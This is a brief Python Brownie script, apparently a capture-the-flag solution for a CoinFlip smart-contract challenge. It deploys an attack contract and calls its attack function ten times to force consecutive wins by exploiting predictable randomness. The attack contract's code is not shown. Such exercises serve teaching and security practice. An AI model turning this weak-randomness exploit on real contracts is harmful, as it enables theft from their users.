from brownie import CoinFlip, CoinFlipHack, network, config, accounts

def main():

    InstanceAddress = "0x1671f9533622C3f764F385E47fea9eEfbA81D308"

    player = accounts.add(config["wallets"]["from_key"]) 

    coinFlip = CoinFlip.at(InstanceAddress)

    print(F"Consuctive wins [BEFORE]: {coinFlip.consecutiveWins()}")

    print("deploying coinFlipAttack Contract")
    coinFlipHack = CoinFlipHack.deploy(coinFlip, {"from": player})

    for x in range(10):
        transaction = coinFlipHack.attack({"from": player})
        transaction.wait(2)

    print(f"Consecutive wins [after]: {coinFlip.consecutiveWins()}")
    assert coinFlip.consecutiveWins() >= 10
